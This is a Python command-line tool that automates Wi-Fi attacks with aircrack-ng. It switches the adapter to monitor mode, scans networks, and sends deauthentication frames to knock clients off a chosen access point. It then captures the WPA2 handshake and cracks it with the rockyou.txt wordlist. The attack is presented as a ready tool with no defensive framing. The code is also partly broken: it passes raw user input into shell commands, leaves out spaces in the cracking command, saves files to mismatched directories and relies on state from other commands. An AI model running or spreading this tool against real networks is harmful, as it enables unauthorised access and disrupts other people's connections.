import typer
import os
import subprocess
from mac_vendor_lookup import MacLookup
from rich.console import Console
from rich.table import Table

# create an object using typer
app = typer.Typer()


# add a decorator @typer.command() before a function declaration to designate that function as a command in CLI application.
@app.command()
def wpa2handshake():  # pass a parameter for the function
    global packageName
    packageName = input("Name of directory to save the package: ")
    os.system("mkdir SniffedNetworkData/" + packageName)

    capFile_name = input("Enter the name to be assigned to the wireshark capture file: ")

    # Define your commands
    command1 = ["airodump-ng", "-c", channel, "--bssid", BSSID, "-w", "DataGenerated/" + packageName + "/" + capFile_name, "wlan0mon"]
    command2 = ["aireplay-ng", "-0", "10", "-a", BSSID, "wlan0mon"]

    # Run both commands simultaneously in the background
    subprocess.Popen(command1)
    subprocess.Popen(command2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("Paste the path for generated capture file ")
    capFile_path = input()

    os.system("wireshark " + capFile_path)
    os.system("aircrack-ng -a2 -b" + BSSID + "-w rockyou.txt " + capFile_path)

@app.command()
def vendorlookup():
    global BSSID
    global channel

    #list the networks
    os.system("airodump-ng --band abg wlan0mon")

    BSSID = input("Enter the BSSID of any network to be sniffed: ")
    channel = input("Enter the channel this network is working on: ")

    # list the connected devices to the network to detect the mac vendor using the mac address
    os.system("airodump-ng wlan0mon -c " + channel + " --bssid " + BSSID)

    # "98:AF:65:B9:F3:E3" is intel
    macAddr = input("Enter the mac address for the vendor lookup: ")
    try:
        print("\nMacAddress: " + macAddr + "\nVendor: " + MacLookup().lookup(macAddr))
    except:
        print("Mac vendor not registered")


# Define the callback function for listing commands
@app.command()
def commands():
    table = Table(title="SentinelGuard Framework module list")

    table.add_column("Command", justify="right", style="cyan", no_wrap=True)
    table.add_column("Function", style="magenta")

    table.add_row("modemon", "Switch the network adptor to a monitor mode")
    table.add_row("vendorlookup", "Pass the mac address and identify the vendor lookup")
    table.add_row("wpa2handshake", "Capture file creation for password cracking")

    console = Console()
    console.print(table)


# at the start of the python application we are calling the object
def main():
    print("Switching the network adapter to monitor mode")
    print("---------------------------------------------------------------------")
    os.system("airmon-ng check kill")
    os.system("airmon-ng start wlan0")
    os.system("ifconfig")
    print("---------------------------------------------------------------------\n\n\n")

    app()


if __name__ == "__main__":
    main()


